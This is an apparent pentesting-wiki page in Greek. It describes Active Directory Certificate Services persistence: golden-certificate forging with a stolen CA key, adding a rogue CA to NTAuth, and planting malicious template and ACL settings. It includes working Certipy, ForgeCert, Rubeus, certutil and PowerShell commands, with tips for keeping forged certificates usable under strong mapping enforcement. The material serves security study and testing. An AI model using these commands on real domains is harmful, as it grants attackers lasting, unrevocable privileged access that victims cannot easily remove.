# AD CS Επίμονη παρουσία στο Domain

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια περίληψη των τεχνικών επίμονης παρουσίας σε domain που κοινοποιήθηκαν στο [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Ελέγξτε το για περισσότερες λεπτομέρειες.

## Πλαστογράφηση πιστοποιητικών με κλεμμένα πιστοποιητικά CA (Golden Certificate) - DPERSIST1

Πώς μπορείτε να καταλάβετε ότι ένα πιστοποιητικό είναι πιστοποιητικό CA;

Μπορεί να προσδιοριστεί ότι ένα πιστοποιητικό είναι πιστοποιητικό CA εάν πληρούνται οι ακόλουθες προϋποθέσεις:

- Το πιστοποιητικό είναι αποθηκευμένο στον CA server, με το ιδιωτικό του κλειδί προστατευμένο από το DPAPI του μηχανήματος, ή από hardware όπως TPM/HSM εάν το λειτουργικό σύστημα το υποστηρίζει.
- Τα πεδία Issuer και Subject του πιστοποιητικού ταιριάζουν με το διακεκριμένο όνομα (distinguished name) της CA.
- Μια επέκταση "CA Version" υπάρχει αποκλειστικά στα πιστοποιητικά CA.
- Το πιστοποιητικό στερείται πεδίων Extended Key Usage (EKU).

Για την εξαγωγή του ιδιωτικού κλειδιού αυτού του πιστοποιητικού, το εργαλείο `certsrv.msc` στον CA server είναι η υποστηριζόμενη μέθοδος μέσω του ενσωματωμένου GUI. Παρ' όλα αυτά, αυτό το πιστοποιητικό δεν διαφέρει από άλλα που είναι αποθηκευμένα στο σύστημα· επομένως, μέθοδοι όπως η [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) μπορούν να εφαρμοστούν για την εξαγωγή.

Το πιστοποιητικό και το ιδιωτικό κλειδί μπορούν επίσης να αποκτηθούν χρησιμοποιώντας Certipy με την ακόλουθη εντολή:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Μετά την απόκτηση του πιστοποιητικού CA και του ιδιωτικού κλειδιού του σε μορφή `.pfx`, εργαλεία όπως το [ForgeCert](https://github.com/GhostPack/ForgeCert) μπορούν να χρησιμοποιηθούν για να δημιουργήσουν έγκυρα πιστοποιητικά:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Ο χρήστης-στόχος για την παραχάραξη πιστοποιητικού πρέπει να είναι ενεργός και ικανός να authenticate στο Active Directory για να πετύχει η διαδικασία. Η παραποίηση πιστοποιητικού για ειδικούς λογαριασμούς όπως krbtgt δεν είναι αποτελεσματική.

Αυτό το παραποιημένο πιστοποιητικό θα είναι **valid** μέχρι την καθορισμένη ημερομηνία λήξης και όσο **το root CA certificate είναι valid** (συνήθως από 5 έως **10+ χρόνια**). Είναι επίσης valid για **machines**, οπότε σε συνδυασμό με **S4U2Self**, ένας επιτιθέμενος μπορεί να **maintain persistence on any domain machine** για όσο το CA certificate είναι valid.\
Επιπλέον, τα **certificates generated** με αυτή τη μέθοδο **cannot be revoked** καθώς η CA δεν είναι ενήμερη γι' αυτά.

### Λειτουργία υπό Strong Certificate Mapping Enforcement (2025+)

Από τις 11 Φεβρουαρίου 2025 (μετά την κυκλοφορία του KB5014754), οι domain controllers έχουν ως προεπιλογή το **Full Enforcement** για τα certificate mappings. Πρακτικά αυτό σημαίνει ότι τα παραποιημένα πιστοποιητικά σας πρέπει είτε:

- Να περιέχουν ένα ισχυρό binding στον λογαριασμό-στόχο (για παράδειγμα, το SID security extension), ή
- Να συνδυάζονται με έναν ισχυρό, ρητό mapping στο attribute `altSecurityIdentities` του αντικειμένου-στόχου.

Μια αξιόπιστη προσέγγιση για persistence είναι να mint ένα παραποιημένο πιστοποιητικό chained στην κλεμμένη Enterprise CA και μετά να προσθέσετε ένα ισχυρό ρητό mapping στον victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Αν μπορείτε να δημιουργήσετε πλαστά πιστοποιητικά που περιλαμβάνουν την επέκταση ασφάλειας SID, αυτά θα αντιστοιχίζονται αυτόματα ακόμη και υπό Full Enforcement. Διαφορετικά, προτιμήστε ρητές, ισχυρές αντιστοιχίσεις. Δείτε [account-persistence](account-persistence.md) για περισσότερα σχετικά με ρητές αντιστοιχίσεις.
- Η ανάκληση δεν βοηθάει τους αμυνόμενους εδώ: τα πλαστά πιστοποιητικά είναι άγνωστα στη βάση δεδομένων της CA και επομένως δεν μπορούν να ανακληθούν.

## Trusting Rogue CA Certificates - DPERSIST2

Το αντικείμενο `NTAuthCertificates` έχει οριστεί να περιέχει ένα ή περισσότερα **πιστοποιητικά CA** στο χαρακτηριστικό `cacertificate`, τα οποία χρησιμοποιεί το Active Directory (AD). Η διαδικασία επαλήθευσης από τον **domain controller** ελέγχει το αντικείμενο `NTAuthCertificates` για μια εγγραφή που ταιριάζει με την **CA specified** στο πεδίο Issuer του πιστοποιητικού που πραγματοποιεί την αυθεντικοποίηση. Η αυθεντικοποίηση προχωράει αν βρεθεί αντιστοιχία.

Ένα αυτο-υπογεγραμμένο πιστοποιητικό CA μπορεί να προστεθεί στο αντικείμενο `NTAuthCertificates` από έναν επιτιθέμενο, εφόσον έχει έλεγχο αυτού του αντικειμένου AD. Κανονικά, μόνο τα μέλη της ομάδας **Enterprise Admin**, καθώς και οι **Domain Admins** ή οι **Administrators** στο **forest root’s domain**, έχουν δικαίωμα να τροποποιήσουν αυτό το αντικείμενο. Μπορούν να επεξεργαστούν το αντικείμενο `NTAuthCertificates` χρησιμοποιώντας το `certutil.exe` με την εντολή `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ή χρησιμοποιώντας το [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Επιπλέον χρήσιμες εντολές για αυτή την τεχνική:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Αυτή η δυνατότητα είναι ιδιαίτερα σχετική όταν χρησιμοποιείται σε συνδυασμό με μια προαναφερθείσα μέθοδο που περιλαμβάνει το ForgeCert για δυναμική δημιουργία πιστοποιητικών.

> Σκέψεις για την αντιστοίχιση μετά το 2025: η τοποθέτηση ενός rogue CA στο NTAuth εγκαθιστά μόνο την εμπιστοσύνη στην εκδούσα CA. Για να χρησιμοποιηθούν leaf certificates για σύνδεση όταν οι DCs βρίσκονται σε **Full Enforcement**, το leaf πρέπει είτε να περιέχει την επέκταση SID security είτε να υπάρχει μια ισχυρή ρητή αντιστοίχιση στο αντικείμενο-στόχο (για παράδειγμα, Issuer+Serial στο `altSecurityIdentities`). Δείτε {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Οι ευκαιρίες για **persistence** μέσω **τροποποιήσεων των security descriptors των AD CS** συστατικών είναι πολλές. Τροποποιήσεις που περιγράφονται στην ενότητα "[Domain Escalation](domain-escalation.md)" μπορούν να υλοποιηθούν κακόβουλα από έναν επιτιθέμενο με αυξημένη πρόσβαση. Αυτό περιλαμβάνει την προσθήκη "control rights" (π.χ., WriteOwner/WriteDACL/κ.λπ.) σε ευαίσθητα στοιχεία όπως:

- Το αντικείμενο **CA server’s AD computer**
- Ο **CA server’s RPC/DCOM server**
- Οποιοδήποτε **descendant AD object or container** μέσα στο **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (για παράδειγμα, το Certificate Templates container, το Certification Authorities container, το NTAuthCertificates object, κ.λπ.)
- **AD groups delegated rights to control AD CS** από προεπιλογή ή από τον οργανισμό (όπως το ενσωματωμένο Cert Publishers group και οποιοδήποτε από τα μέλη του)

Ένα παράδειγμα κακόβουλης υλοποίησης θα περιλάμβανε έναν επιτιθέμενο, ο οποίος έχει **elevated permissions** στο domain, να προσθέτει την άδεια **`WriteOwner`** στο προεπιλεγμένο πιστοποιητικό template **`User`**, με τον επιτιθέμενο να είναι ο κύριος για το δικαίωμα. Για να το εκμεταλλευτεί, ο επιτιθέμενος πρώτα θα άλλαζε την ιδιοκτησία του template **`User`** σε αυτόν. Στη συνέχεια, το **`mspki-certificate-name-flag`** θα οριζόταν σε **1** στο template για να ενεργοποιήσει το **`ENROLLEE_SUPPLIES_SUBJECT`**, επιτρέποντας σε έναν χρήστη να παράσχει ένα Subject Alternative Name στο request. Κατόπιν, ο επιτιθέμενος θα μπορούσε να **enroll** χρησιμοποιώντας το **template**, επιλέγοντας ένα όνομα **domain administrator** ως alternative name, και να χρησιμοποιήσει το αποκτηθέν πιστοποιητικό για authentication ως DA.

Πρακτικές ρυθμίσεις που μπορεί να ορίσουν οι επιτιθέμενοι για μακροχρόνια persistence στο domain (βλ. {{#ref}}domain-escalation.md{{#endref}} για πλήρεις λεπτομέρειες και detection):

- Σημαίες πολιτικής CA που επιτρέπουν SAN από requesters (π.χ., ενεργοποίηση `EDITF_ATTRIBUTESUBJECTALTNAME2`). Αυτό διατηρεί exploitable μονοπάτια τύπου ESC1.
- DACL του template ή ρυθμίσεις που επιτρέπουν έκδοση κατάλληλη για authentication (π.χ., προσθήκη Client Authentication EKU, ενεργοποίηση `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Έλεγχος του αντικειμένου `NTAuthCertificates` ή των CA containers για συνεχή επανεισαγωγή rogue issuers αν οι αμυνόμενοι προσπαθήσουν καθαρισμό.

> [!TIP]
> Σε hardened περιβάλλοντα μετά το KB5014754, ο συνδυασμός αυτών των misconfigurations με ρητές ισχυρές αντιστοιχίσεις (`altSecurityIdentities`) διασφαλίζει ότι τα εκδοθέντα ή forged πιστοποιητικά παραμένουν χρησιμοποιήσιμα ακόμη και όταν οι DCs εφαρμόζουν strong mapping.



## Αναφορές

- Microsoft KB5014754 – Αλλαγές στην certificate-based authentication σε Windows domain controllers (χρονικό πλαίσιο εφαρμογής και strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference και χρήση forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
